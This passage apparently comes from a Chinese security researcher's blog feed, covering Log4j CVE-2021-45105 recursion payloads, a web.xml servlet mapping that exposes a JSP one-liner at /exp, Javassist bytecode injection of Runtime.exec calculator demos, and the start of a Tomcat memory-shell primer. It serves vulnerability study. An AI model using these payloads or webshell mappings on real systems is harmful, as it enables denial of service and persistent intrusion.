class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-::-$$&#123;::-$&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$ 会进入一个异常</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146945232-9157632d-2463-4d2c-976d-544e49ff249c.png" alt="image"></p><p><del>说不定其他解析表达式也存在。。。。</del></p><p><a href="https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor">https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor</a></p><p><a href="https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc">https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc</a></p><p>更新 2021/12/22</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在配置文件中配置：$$&#123;ctx:apiVersion&#125;   则输入 $&#123;$&#123;ctx:apiVersion&#125;&#125;或$&#123;$&#123;::-$&#123;::-$$&#123;::-aaa&#125;&#125;&#125;&#125;则可以造成递归dos</span><br><span class="line">在配置文件中配置：$&#123;ctx:apiVersion&#125;   则输入$&#123;$&#123;::-$&#123;::-$$&#123;::-dos&#125;&#125;&#125;&#125;则可以造成递归dos</span><br></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>cve:<a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODA4Mw==&amp;mid=2247484028&amp;idx=1&amp;sn=5748c6b75530a786f1bf0622616413c6&amp;chksm=cf45fa30f83273269da4884f82c5d4ce43089d6ba8a7b6470e35f963d690ec781faa85ab48e1&amp;mpshare=1&amp;scene=23&amp;srcid=12298p7j6KLY39FVuwNzmFRD&amp;sharer_sharetime=1640749370687&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">聊聊配置文件 RCE 这件事</a></p><p>不愧是师傅总结的不错，简单的说就是通过配置文件去rce.<br>突然又想到了一个：web.xml里面添加servlet去实现解析一句话。<br>访问/exp路由就会解析</p><p><img src="https://user-images.githubusercontent.com/63966847/147626724-576ba23e-7fdf-4b73-b591-095af4578f8a.png" alt="image"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/WEB-INF/1.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/exp<span class="tag">&lt;/<span class="name">url-patten</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>主要是自己的问题，</p><p>第一点是读文档的习惯少导致不理解其中的意思失去第一时间拥有exp</p><p>第二点是自己没有考虑到dos中的网络连接超时问题。</p><p>第三点是自己发现了ResourceBundleLookup类却不知道其意思导致失去新思路的发现。</p><p>（如果官方在删除lookup功能我相信还会有更多的漏洞。。。。。。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> test image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python安全</title>
      <link href="/2022/01/01/1/"/>
      <url>/2022/01/01/1/</url>
      
        <content type="html"><![CDATA[<h2 id="top-img-images-下载-png"><a href="#top-img-images-下载-png" class="headerlink" title="top_img: /images/下载.png"></a>top_img: /images/下载.png</h2><h1 id="apache-storm"><a href="#apache-storm" class="headerlink" title="apache storm"></a>apache storm</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://blog.51cto.com/u_13870740/3445168">https://blog.51cto.com/u_13870740/3445168</a></p><p><a href="https://github.com/heibaiying/BigData-Notes/blob/master/notes/installation/Storm%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">https://github.com/heibaiying/BigData-Notes/blob/master/notes/installation/Storm%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup bash storm dev-zookeeper &amp; bash storm nimbus &amp; bash storm supervisor &amp;bash storm ui &amp; bash storm logviewer &amp;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://paper.seebug.org/1780/#0x03">https://paper.seebug.org/1780/#0x03</a></p><p><a href="https://blog.noah.360.net/apache-storm-vulnerability-analysis/">https://blog.noah.360.net/apache-storm-vulnerability-analysis/</a></p><p><a href="https://y4er.com/posts/apache-storm-two-cve/">https://y4er.com/posts/apache-storm-two-cve/</a></p><p><strong>自己尝试反序列化并没有成功cb,环境是2.1.0</strong></p>]]></content>
      
      
      <categories>
          
          <category> python security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>啥也没有</title>
      <link href="/2022/01/01/yso%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/01/01/yso%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>参考：</p><p><a href="https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Javassist</title>
      <link href="/2021/12/10/Javassist/"/>
      <url>/2021/12/10/Javassist/</url>
      
        <content type="html"><![CDATA[<h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Javassist</code>是一个开源的分析、编辑和创建 Java 字节码的类库；相对于<code>ASM</code>，<code>Javassist</code>提供了更加简单便捷的<code>API</code>。通过<code>Javassist</code>，我们可以像写<code>Java</code>代码一样直接插入<code>Java</code>代码片段，不用关注<code>Java</code>底层的字节码和栈操作，仅仅需要学会使用<code>Javassist</code>的<code>API</code>即可实现字节码编辑。</p><h2 id="API和标识符"><a href="#API和标识符" class="headerlink" title="API和标识符"></a>API和标识符</h2><p><code>Javassist</code>提供了类似于 Java 反射机制的 API，如 <a href="http://www.javassist.org/html/javassist/CtClass.html">CtClass</a>，<a href="http://www.javassist.org/html/javassist/CtConstructor.html">CtConstructor</a>、<a href="http://www.javassist.org/html/javassist/CtMethod.html">CtMethod</a>、<a href="http://www.javassist.org/html/javassist/CtField.html">CtField</a> 与 Java 反射的<code>class</code>、<code>Constructor</code>、<code>Method</code>、<code>Field</code>非常的相似。</p><div class="table-container"><table><thead><tr><th>类</th><th>描述</th></tr></thead><tbody><tr><td>ClassPool</td><td>ClassPool是一个存储CtClass的容器，如果调用<code>get</code>方法会搜索并创建一个表示该类的CtClass对象</td></tr><tr><td>CtClass</td><td>CtClass表示的是从ClassPool获取的类对象，可对该类就行读写编辑等操作</td></tr><tr><td>CtMethod</td><td>可读写的类方法对象</td></tr><tr><td>CtConstructor</td><td>可读写的类构造方法对象</td></tr><tr><td>CtField</td><td>可读写的类成员变量对象</td></tr></tbody></table></div><p><code>Javassist</code>使用了内置的标识符来表示一些特定的含义，如：<code>$_</code>表示返回值。我们可以在动态插入类代码的时候使用这些特殊的标识符来表示对应的对象。</p><div class="table-container"><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td><code>$0, $1, $2, ...</code></td><td><code>this</code>和方法参数</td></tr><tr><td><code>$args</code></td><td><code>Object[]</code>类型的参数数组</td></tr><tr><td>$$$$</td><td>所有的参数，如<code>m($$)</code>等价于<code>m($1,$2,...)</code></td></tr><tr><td><code>$cflow(...)</code></td><td>cflow变量</td></tr><tr><td><code>$r</code></td><td>返回类型，用于类型转换</td></tr><tr><td><code>$w</code></td><td>包装类型，用于类型转换</td></tr><tr><td><code>$_</code></td><td>方法返回值</td></tr><tr><td><code>$sig</code></td><td>方法签名，返回<code>java.lang.Class[]</code>数组类型</td></tr><tr><td><code>$type</code></td><td>返回值类型，<code>java.lang.Class</code>类型</td></tr><tr><td><code>$class</code></td><td>当前类，<code>java.lang.Class</code>类型</td></tr></tbody></table></div><h2 id="读取类-成员变量-方法信息"><a href="#读取类-成员变量-方法信息" class="headerlink" title="读取类/成员变量/方法信息"></a>读取类/成员变量/方法信息</h2><p><code>Javassist</code>通过<code>ClassPool</code>对象获取到<code>CtClass</code>对象后就可以像使用 Java 反射 API 一样去读取类信息</p><p><code>Javassist</code>读取类信息示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 获取类对象</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;解析类名：&quot;</span>+ ctClass.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;父类：&quot;</span>+ ctClass.getSuperclass());</span><br><span class="line">        System.out.println(<span class="string">&quot;实现接口：&quot;</span>+ Arrays.toString(ctClass.getInterfaces()));</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取所有构造方法</span></span><br><span class="line">        CtConstructor[] constructors = ctClass.getDeclaredConstructors();</span><br><span class="line">        <span class="comment">// 获取所有成员变量</span></span><br><span class="line">        CtField[] ctFields = ctClass.getDeclaredFields();</span><br><span class="line">        <span class="comment">// 获取所有成员方法</span></span><br><span class="line">        CtMethod[] ctMethods = ctClass.getDeclaredMethods();</span><br><span class="line">        <span class="comment">// 输出所有的构造方法</span></span><br><span class="line">        <span class="keyword">for</span>(CtConstructor constructor:constructors)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;构造方法：&quot;</span>+ constructor);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 输出所有的成员变量</span></span><br><span class="line">        <span class="keyword">for</span>(CtField ctField:ctFields)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成员变量：&quot;</span>+ctField);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 输出所有的成员方法</span></span><br><span class="line">        <span class="keyword">for</span>(CtMethod ctMethod: ctMethods)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成员方法：&quot;</span>+ctMethod);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="images/image-20221001170103439.png" alt="image-20221001170103439"></p><h2 id="修改类方法"><a href="#修改类方法" class="headerlink" title="修改类方法"></a>修改类方法</h2><p><code>CtMethod</code>提供了类方法修改的<code>API</code>：</p><ul><li><code>setModifies()</code>：修改类的访问修饰符</li><li><code>insertBefore()</code>：在类方法执行前插入任意 Java 代码片段</li><li><code>insertAfter()</code>：在类方法执行后插入任意 Java 代码片段</li><li><code>setBody()</code>：修改整个方法的代码</li><li><code>removeField()</code>：删除类的成员变量</li><li><code>removeMethod()</code>：删除类的方法</li></ul><p>修改前：<br><img src="images/image-20221001175527019.png" alt="image-20221001175527019"></p><p>修改类方法代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 获取类对象</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取hello方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;);</span><br><span class="line">        <span class="comment">// 修改hello方法访问权限为private</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">// 修改整个hello方法</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span> +</span><br><span class="line">                         <span class="string">&quot;return \&quot;ok!\&quot;;&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">// 替换原有的文件，绝对路径</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;target/classes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后类文件被修改如下<br><img src="images/image-20221001232420549.png" alt="image-20221001232420549"></p><p>再次运行时执行我们插入的命令执行代码片段<br><img src="images/image-20221001232449700.png" alt="image-20221001232449700"></p><h2 id="动态创建Java类二进制"><a href="#动态创建Java类二进制" class="headerlink" title="动态创建Java类二进制"></a>动态创建Java类二进制</h2><p><code>Javassist</code>可以动态的创建一个类的二进制，例如需要生成一个<code>HelloWorld</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span> + name);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>Javassist</code>生成类字节码示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 创建HelloWorld类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">helloWorldClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建类成员</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;private static String name = \&quot;dotast\&quot;;&quot;</span>,helloWorldClass);</span><br><span class="line">        <span class="comment">// 添加类成员到类中</span></span><br><span class="line">        helloWorldClass.addField(ctField);</span><br><span class="line">        <span class="comment">// 创建 main 主方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">mainMethod</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public static void main(String[] args)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        System.out.println(\&quot;Hello\&quot; + name);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;&quot;</span>, helloWorldClass);</span><br><span class="line">        helloWorldClass.addMethod(mainMethod);</span><br><span class="line">        <span class="comment">// 替换原有的文件，绝对路径</span></span><br><span class="line">        helloWorldClass.writeFile(<span class="string">&quot;target/classes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>生成后如下<br><img src="images/image-20221002000336101.png" alt="image-20221002000336101"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马之Listener</title>
      <link href="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马之Listener"><a href="#Tomcat内存马之Listener" class="headerlink" title="Tomcat内存马之Listener"></a>Tomcat内存马之Listener</h1><h2 id="初识Tomcat内存马"><a href="#初识Tomcat内存马" class="headerlink" title="初识Tomcat内存马"></a>初识Tomcat内存马</h2><p>关于内存马，第一次接触是 PHP 的不死马，其原理是在内存中执行死循环，并删除自身文件，起到维持权限的作用，而 Tomcat 的内存马原理则与其不同。</p><p>在前面的学习我们知道，在 Java 程序中，HTTP 的请求会按照<code>Listener --&gt; Filter --&gt; Servlet</code>的顺序经过这三大组件，Tomcat 内存马则在请求的过程中修改程序本身的组件或者注册新的恶意组件到 Tomcat 服务器中，插入恶意代码，完成内存马的注入。</p><p>Tomcat 内存马技术的实现依赖于<code>Servlet 3.0</code>版本之后的动态注册组件，而 Tomcat 7.x 版本才开始支持<code>Servlet 3.0</code>。</p><h2 id="Tomcat基础知识"><a href="#Tomcat基础知识" class="headerlink" title="Tomcat基础知识"></a>Tomcat基础知识</h2><p>在学习 Java 内存马之前，我们得了解一些关于 Tomcat 的基础知识。</p><p>Tomcat 本身是由 Apache 软件基金会属下 Jakarta 开发的 Servlet 容器，目的是实现对 Servlet 和 JSP 的支持。其广为人知的是充当 Java 程序的 Web服务器，这是因为在 Tomcat 中内嵌了 HTTP 服务器。</p><p>Tomcat 对于 HTTP 请求的处理可以简化成如下图所示：<br><img src="images/image-20221026123041907.png" alt="image-20221026123041907"></p><p>Tomcat 通过<code>Connector</code>组件接收并解析 HTTP 请求报文，创建<code>ServletRequest</code>对象发送给<code>Container</code>容器进行处理。<code>Container</code>容器处理完之后将响应封装成<code>ServletResponse</code>对象返回到<code>Connector</code>组件，<code>Connector</code>将其转换成 HTTP 响应报文返回到客户端，完成一次请求响应动作。</p><p>下面简单了解一下其中的组件和服务。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p><code>Server</code>指代整个 Tomcat 服务器，主要提供接口让其他程序能访问到<code>Service</code>里面，同时维护它所包含的所有<code>Service</code>生命周期（初始化到服务结束等）。Tomcat 只存在一个<code>Server</code>，而<code>Server</code>中至少存在一个<code>Service</code>组件。</p><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p><code>Service</code>包含<code>Connector</code>、<code>Container</code>和其他若干组件，对外提供服务。一个<code>Service</code>可以设置多个<code>Connector</code>组件，但只能有一个<code>Container</code>容器。Tomcat 中<code>Service</code>接口的标准实现类是<code>StandardService</code>，该类还实现了<code>Lifecycle</code>接口用于控制下面组件的生命周期。</p><h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p><code>Connector</code>组件是 Tomcat 中的核心组件之一，主要任务是接受客户端发送的 tcp 连接请求，创建 Request 和 Response 对象分别用于和请求端交换数据，接着生成线程用于处理这两个对象，最后转换成<code>ServletRequest</code>对象传递给<code>Container</code>容器。总结其功能如下：</p><ol><li>和客户端建立通信。</li><li>解析和处理应用层协议，将其封装成 Request 和 Response 对象，将 Request 对象转换成<code>ServletRequest</code>对象，传递给<code>Container</code>容器。</li><li>接收<code>Container</code>传递回来的<code>ServletResponse</code>对象，处理成 Response 对象，转换成 HTTP 响应报文返回到客户端。</li></ol><p>总结图如下所示：<br><img src="images/image-20221026144545789.png" alt="image-20221026144545789"></p><p>从图中可以看到，<code>Connector</code>组件的工作由这三个子组件：<code>EndPoint</code>、<code>Processor</code>和<code>Adapter</code>共同完成，分别负责的功能如下：</p><ul><li><code>EndPoint</code>：负责网络通信，传递字节流到<code>Processor</code>。</li><li><code>Processor</code>：负责处理字节流生成 Tomcat Request 对象，传递到<code>Adapter</code>。</li><li><code>Adapter</code>：负责处理 Tomcat Request 对象，将其转换成<code>ServletRequest</code>。</li></ul><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p><code>Container</code>，别名为<code>Catalina</code>，用于处理<code>Connector</code>组件传递过来的<code>ServletRequest</code>请求。<code>Container</code>容器采用责任链的设计模式，含有四个子容器：<code>Engine</code>、<code>HOST</code>、<code>Context</code>和<code>Wrapper</code>。这四个子容器不是平行关系，而是父子关系，包含关系如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Engine &lt;-- Host &lt;-- Context &lt;-- 